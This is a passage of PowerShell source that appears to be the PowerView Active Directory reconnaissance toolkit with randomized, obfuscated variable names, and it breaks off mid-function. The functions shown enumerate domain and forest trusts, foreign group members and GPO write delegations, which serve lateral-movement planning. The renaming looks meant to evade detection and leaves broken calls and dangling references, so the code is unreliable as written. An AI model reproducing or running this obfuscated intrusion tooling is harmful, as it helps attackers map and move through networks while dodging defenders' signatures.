                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $YePFivOGqr, $b07KAXTqvUWxSfk, $QWX1OeqTMV876JyRF
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'GroupName' = $YePFivOGqr
                'Method' = $b07KAXTqvUWxSfk
                'TokenHandle' = $QWX1OeqTMV876JyRF
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}








function Get-DomainTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $KqdXAELi,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $q,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TV = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $hqeVA = @{}
        if ($PSBoundParameters['Domain']) { $hqeVA['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $hqeVA['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['Properties']) { $hqeVA['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $hqeVA['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $hqeVA['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $hqeVA['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $hqeVA['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $hqeVA['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $hqeVA['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $hqeVA['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($2Pc3tSl3HYh.ParameterSetName -ne 'API') {
            $pGBjNAHoV = @{}
            if ($3Ecdwi8qNy -and $3Ecdwi8qNy.Trim() -ne '') {
                $A3JNWIyGOuaX9mP = $3Ecdwi8qNy
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $A3JNWIyGOuaX9mP = (Get-3Ecdwi8qNy -3ezVSfm6f4k $3ezVSfm6f4k).Name
                }
                else {
                    $A3JNWIyGOuaX9mP = (Get-3Ecdwi8qNy).Name
                }
            }
        }
        elseif ($2Pc3tSl3HYh.ParameterSetName -ne 'NET') {
            if ($3Ecdwi8qNy -and $3Ecdwi8qNy.Trim() -ne '') {
                $A3JNWIyGOuaX9mP = $3Ecdwi8qNy
            }
            else {
                $A3JNWIyGOuaX9mP = $8MSydlAwkKhVgnu4Ls10:USERDNSDOMAIN
            }
        }

        if ($2Pc3tSl3HYh.ParameterSetName -eq 'LDAP') {
            
            $xH9Mt = Get-DomainSearcher @LdapSearcherArguments
            $7DRmTI2dehZ6xN2e1ty = Get-DomainSID @NetSearcherArguments

            if ($xH9Mt) {

                $xH9Mt.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $xH9Mt.FindOne() }
                else { $nhxRs5G1 = $xH9Mt.FindAll() }
                $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                    $kp43IGbi1c6 = $_.Properties
                    $PJ4bQVq = New-Object PSObject

                    $EyWGpKPsrUH = @()
                    $EyWGpKPsrUH += $TV.Keys | Where-Object { $kp43IGbi1c6.trustattributes[0] -band $_ } | ForEach-Object { $TV[$_] }

                    $eZoyZTBL2Zdxy17PS = Switch ($kp43IGbi1c6.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $WEBvygsLSPml = Switch ($kp43IGbi1c6.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Tm17BPMwz8VWplgQ2h = $kp43IGbi1c6.distinguishedname[0]
                    $SourceNameIndexfKS = $Tm17BPMwz8VWplgQ2h.IndexOf('DC=')
                    if ($SourceNameIndexfKS) {
                        $A3JNWIyGOuaX9mP = $($Tm17BPMwz8VWplgQ2h.SubString($SourceNameIndexfKS)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $A3JNWIyGOuaX9mP = ""
                    }

                    $RWHf6 = $Tm17BPMwz8VWplgQ2h.IndexOf(',CN=System')
                    if ($SourceNameIndexfKS) {
                        $l6OxARucBpbqH124jLlwS = $Tm17BPMwz8VWplgQ2h.SubString(3, $RWHf6-3)
                    }
                    else {
                        $l6OxARucBpbqH124jLlwS = ""
                    }

                    $2wvJBUkZk = New-Object Guid @(,$kp43IGbi1c6.objectguid[0])
                    $iGUxNunanZGLKeqKM = (New-Object System.Security.Principal.SecurityIdentifier($kp43IGbi1c6.securityidentifier[0],0)).Value

                    $PJ4bQVq | Add-Member Noteproperty 'SourceName' $A3JNWIyGOuaX9mP
                    $PJ4bQVq | Add-Member Noteproperty 'TargetName' $kp43IGbi1c6.name[0]
                    
                    $PJ4bQVq | Add-Member Noteproperty 'TrustType' $WEBvygsLSPml
                    $PJ4bQVq | Add-Member Noteproperty 'TrustAttributes' $($EyWGpKPsrUH -join ',')
                    $PJ4bQVq | Add-Member Noteproperty 'TrustDirection' "$eZoyZTBL2Zdxy17PS"
                    $PJ4bQVq | Add-Member Noteproperty 'WhenCreated' $kp43IGbi1c6.whencreated[0]
                    $PJ4bQVq | Add-Member Noteproperty 'WhenChanged' $kp43IGbi1c6.whenchanged[0]
                    $PJ4bQVq.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $PJ4bQVq
                }
                if ($nhxRs5G1) {
                    try { $nhxRs5G1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $xH9Mt.dispose()
            }
        }
        elseif ($2Pc3tSl3HYh.ParameterSetName -eq 'API') {
            
            if ($PSBoundParameters['Server']) {
                $6Jb4jEBKCmIxrkS = $Gkd0Hz5f
            }
            elseif ($3Ecdwi8qNy -and $3Ecdwi8qNy.Trim() -ne '') {
                $6Jb4jEBKCmIxrkS = $3Ecdwi8qNy
            }
            else {
                
                $6Jb4jEBKCmIxrkS = $qYFR5PCZruUkdna9T
            }

            
            $bmkq67sA3ALUu13wNpA7pV1 = [IntPtr]::Zero

            
            $DJuybACyhCbUsHfG = 63
            $3D = 0

            
            $2KUDvV2HojTSzhMzNmslFPRL = $jmL9QM8qOyJ0k::DsEnumerateDomainTrusts($6Jb4jEBKCmIxrkS, $DJuybACyhCbUsHfG, [ref]$bmkq67sA3ALUu13wNpA7pV1, [ref]$3D)

            
            $2iCxJSbEZDQFphllc9F = $bmkq67sA3ALUu13wNpA7pV1.ToInt64()

            
            if (($2KUDvV2HojTSzhMzNmslFPRL -eq 0) -and ($2iCxJSbEZDQFphllc9F -gt 0)) {

                
                $kUONtubjrVMELIws = $Zx6siTaGPK::GetSize()

                
                for ($RGKU3QpH = 0; ($RGKU3QpH -lt $3D); $RGKU3QpH++) {
                    
                    $vKDIY5WdQizyLZ4rDCi = New-Object System.Intptr -ArgumentList $2iCxJSbEZDQFphllc9F
                    $vWCMTsyOgr08a = $vKDIY5WdQizyLZ4rDCi -as $Zx6siTaGPK

                    $2iCxJSbEZDQFphllc9F = $vKDIY5WdQizyLZ4rDCi.ToInt64()
                    $2iCxJSbEZDQFphllc9F += $kUONtubjrVMELIws

                    $TICkroQVYfm = ''
                    $2KUDvV2HojTSzhMzNmslFPRL = $b8ZFNi9uGrz0TyhMxtc2s3R5Q::ConvertSidToStringSid($vWCMTsyOgr08a.DomainSid, [ref]$TICkroQVYfm);$ZPR8SXJ1J = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($2KUDvV2HojTSzhMzNmslFPRL -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $ZPR8SXJ1J).Message)"
                    }
                    else {
                        $PJ4bQVq = New-Object PSObject
                        $PJ4bQVq | Add-Member Noteproperty 'SourceName' $A3JNWIyGOuaX9mP
                        $PJ4bQVq | Add-Member Noteproperty 'TargetName' $vWCMTsyOgr08a.DnsDomainName
                        $PJ4bQVq | Add-Member Noteproperty 'TargetNetbiosName' $vWCMTsyOgr08a.NetbiosDomainName
                        $PJ4bQVq | Add-Member Noteproperty 'Flags' $vWCMTsyOgr08a.Flags
                        $PJ4bQVq | Add-Member Noteproperty 'ParentIndex' $vWCMTsyOgr08a.ParentIndex
                        $PJ4bQVq | Add-Member Noteproperty 'TrustType' $vWCMTsyOgr08a.TrustType
                        $PJ4bQVq | Add-Member Noteproperty 'TrustAttributes' $vWCMTsyOgr08a.TrustAttributes
                        $PJ4bQVq | Add-Member Noteproperty 'TargetSid' $TICkroQVYfm
                        $PJ4bQVq | Add-Member Noteproperty 'TargetGuid' $vWCMTsyOgr08a.DomainGuid
                        $PJ4bQVq.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $PJ4bQVq
                    }
                }
                
                $qYFR5PCZruUkdna9T = $jmL9QM8qOyJ0k::NetApiBufferFree($bmkq67sA3ALUu13wNpA7pV1)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $2KUDvV2HojTSzhMzNmslFPRL).Message)"
            }
        }
        else {
            
            $nlW1d = Get-3Ecdwi8qNy @NetSearcherArguments
            if ($nlW1d) {
                $nlW1d.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $83xk0,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $QP = @{}
        if ($PSBoundParameters['Forest']) { $QP['Forest'] = $83xk0 }
        if ($PSBoundParameters['Credential']) { $QP['Credential'] = $3ezVSfm6f4k }

        $5PFVvHDdQlhj84Z7CrA6 = Get-83xk0 @NetForestArguments

        if ($5PFVvHDdQlhj84Z7CrA6) {
            $5PFVvHDdQlhj84Z7CrA6.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{}
        $wtWPex5R['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        if ($PSBoundParameters['Raw']) { $wtWPex5R['Raw'] = $VcZPt }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($gn in $_.memberof) {
                $hwT = $gn.IndexOf('DC=')
                if ($hwT) {

                    $I5SvBl8QZyjfq3cGwo = $($gn.SubString($hwT)) -replace 'DC=','' -replace ',','.'
                    $xYlKjVo8vACnZpUsEqdXakS = $_.distinguishedname
                    $ItC5P5DFHB9mXwj0 = $xYlKjVo8vACnZpUsEqdXakS.IndexOf('DC=')
                    $hZmS = $($_.distinguishedname.SubString($ItC5P5DFHB9mXwj0)) -replace 'DC=','' -replace ',','.'

                    if ($I5SvBl8QZyjfq3cGwo -ne $hZmS) {
                        
                        $YePFivOGqr = $gn.Split(',')[0].split('=')[1]
                        $xP45Czb1 = New-Object PSObject
                        $xP45Czb1 | Add-Member Noteproperty 'UserDomain' $hZmS
                        $xP45Czb1 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $xP45Czb1 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $xP45Czb1 | Add-Member Noteproperty 'GroupDomain' $I5SvBl8QZyjfq3cGwo
                        $xP45Czb1 | Add-Member Noteproperty 'GroupName' $YePFivOGqr
                        $xP45Czb1 | Add-Member Noteproperty 'GroupDistinguishedName' $gn
                        $xP45Czb1.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $xP45Czb1
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{}
        $wtWPex5R['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        if ($PSBoundParameters['Raw']) { $wtWPex5R['Raw'] = $VcZPt }
    }

    PROCESS {
        
        $3bSIHonMVxEWRNi = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $3bSIHonMVxEWRNi -notcontains $_.samaccountname } | ForEach-Object {
            $YePFivOGqr = $_.samAccountName
            $nYU7dKZGulm = $_.distinguishedname
            $I5SvBl8QZyjfq3cGwo = $nYU7dKZGulm.SubString($nYU7dKZGulm.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                
                
                $BPquDpdymSvZi = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($I5SvBl8QZyjfq3cGwo -ne $BPquDpdymSvZi)) {
                    $K16noqOHPCkyVuvd5RG = $_
                    $eaRfX5NtC4 = $_.Split(',')[0].split('=')[1]

                    $YK1eof0lS5j6 = New-Object PSObject
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'GroupDomain' $I5SvBl8QZyjfq3cGwo
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'GroupName' $YePFivOGqr
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'GroupDistinguishedName' $nYU7dKZGulm
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'MemberDomain' $BPquDpdymSvZi
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'MemberName' $eaRfX5NtC4
                    $YK1eof0lS5j6 | Add-Member Noteproperty 'MemberDistinguishedName' $K16noqOHPCkyVuvd5RG
                    $YK1eof0lS5j6.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $YK1eof0lS5j6
                }
            }
        }
    }
}


function Get-DomainTrustMapping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $KqdXAELi,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $q,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    
    $fX0K8a = @{}

    
    $CUmXrFpjnM7a1F7CEZX = New-Object System.Collections.Stack

    $VFkdxjhrmeBoNDWf = @{}
    if ($PSBoundParameters['API']) { $VFkdxjhrmeBoNDWf['API'] = $KqdXAELi }
    if ($PSBoundParameters['NET']) { $VFkdxjhrmeBoNDWf['NET'] = $q }
    if ($PSBoundParameters['LDAPFilter']) { $VFkdxjhrmeBoNDWf['LDAPFilter'] = $c7rZO2V9 }
    if ($PSBoundParameters['Properties']) { $VFkdxjhrmeBoNDWf['Properties'] = $UtHQ }
    if ($PSBoundParameters['SearchBase']) { $VFkdxjhrmeBoNDWf['SearchBase'] = $h2yNsAt }
    if ($PSBoundParameters['Server']) { $VFkdxjhrmeBoNDWf['Server'] = $Gkd0Hz5f }
    if ($PSBoundParameters['SearchScope']) { $VFkdxjhrmeBoNDWf['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
    if ($PSBoundParameters['ResultPageSize']) { $VFkdxjhrmeBoNDWf['ResultPageSize'] = $dTP7Qv6RslNUx }
    if ($PSBoundParameters['ServerTimeLimit']) { $VFkdxjhrmeBoNDWf['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
    if ($PSBoundParameters['Tombstone']) { $VFkdxjhrmeBoNDWf['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
    if ($PSBoundParameters['Credential']) { $VFkdxjhrmeBoNDWf['Credential'] = $3ezVSfm6f4k }

    
    if ($PSBoundParameters['Credential']) {
        $z = (Get-3Ecdwi8qNy -3ezVSfm6f4k $3ezVSfm6f4k).Name
    }
    else {
        $z = (Get-3Ecdwi8qNy).Name
    }
    $CUmXrFpjnM7a1F7CEZX.Push($z)

    while($CUmXrFpjnM7a1F7CEZX.Count -ne 0) {

        $3Ecdwi8qNy = $CUmXrFpjnM7a1F7CEZX.Pop()

        
        if ($3Ecdwi8qNy -and ($3Ecdwi8qNy.Trim() -ne '') -and (-not $fX0K8a.ContainsKey($3Ecdwi8qNy))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$3Ecdwi8qNy'"

            
            $qYFR5PCZruUkdna9T = $fX0K8a.Add($3Ecdwi8qNy, '')

            try {
                
                $VFkdxjhrmeBoNDWf['Domain'] = $3Ecdwi8qNy
                $TrustsySuB56AwTQ9ERfZP = Get-DomainTrust @DomainTrustArguments

                if ($TrustsySuB56AwTQ9ERfZP -isnot [System.Array]) {
                    $TrustsySuB56AwTQ9ERfZP = @($TrustsySuB56AwTQ9ERfZP)
                }

                
                if ($2Pc3tSl3HYh.ParameterSetName -eq 'NET') {
                    $LkVav = @{}
                    if ($PSBoundParameters['Forest']) { $LkVav['Forest'] = $83xk0 }
                    if ($PSBoundParameters['Credential']) { $LkVav['Credential'] = $3ezVSfm6f4k }
                    $TrustsySuB56AwTQ9ERfZP += Get-ForestTrust @ForestTrustArguments
                }

                if ($TrustsySuB56AwTQ9ERfZP) {
                    if ($TrustsySuB56AwTQ9ERfZP -isnot [System.Array]) {
                        $TrustsySuB56AwTQ9ERfZP = @($TrustsySuB56AwTQ9ERfZP)
                    }

                    
                    ForEach ($ZnFQAkc7KU in $TrustsySuB56AwTQ9ERfZP) {
                        if ($ZnFQAkc7KU.SourceName -and $ZnFQAkc7KU.TargetName) {
                            
                            $qYFR5PCZruUkdna9T = $CUmXrFpjnM7a1F7CEZX.Push($ZnFQAkc7KU.TargetName)
                            $ZnFQAkc7KU
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function Get-GPODelegation {


    [CmdletBinding()]
    Param (
        [String]
        $El0sdi2IQySFWMBb5 = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $fjT6aGwCaC85K6KRIKbgmfM = 200
    )

    $B39EIx = @('SYSTEM','Domain Admins','Enterprise Admins')

    $83xk0 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $t6Tbbq97x = @($83xk0.Domains)
    $CUmXrFpjnM7a1F7CEZX = $t6Tbbq97x | foreach { $_.GetDirectoryEntry() }
    foreach ($3Ecdwi8qNy in $CUmXrFpjnM7a1F7CEZX) {
        $Iq7bLVAvhKnpjdMlH2 = "(&(objectCategory=groupPolicyContainer)(displayname=$El0sdi2IQySFWMBb5))"
        $lW1SUjy = New-Object System.DirectoryServices.DirectorySearcher
        $lW1SUjy.SearchRoot = $3Ecdwi8qNy
        $lW1SUjy.Filter = $Iq7bLVAvhKnpjdMlH2
        $lW1SUjy.PageSize = $fjT6aGwCaC85K6KRIKbgmfM
        $lW1SUjy.SearchScope = "Subtree"
        $ulr4 = $lW1SUjy.FindAll()
        foreach ($XjTnEcjsPeGHlMl2pD in $ulr4){
            $JlWqeGpYS = ([ADSI]$XjTnEcjsPeGHlMl2pD.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $B39EIx -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($JlWqeGpYS -ne $qYFR5PCZruUkdna9T){
            $Qkx = New-Object psobject
            $Qkx | Add-Member Noteproperty 'ADSPath' $XjTnEcjsPeGHlMl2pD.Properties.adspath
            $Qkx | Add-Member Noteproperty 'GPODisplayName' $XjTnEcjsPeGHlMl2pD.Properties.displayname
            $Qkx | Add-Member Noteproperty 'IdentityReference' $JlWqeGpYS.IdentityReference
            $Qkx | Add-Member Noteproperty 'ActiveDirectoryRights' $JlWqeGpYS.ActiveDirectoryRights
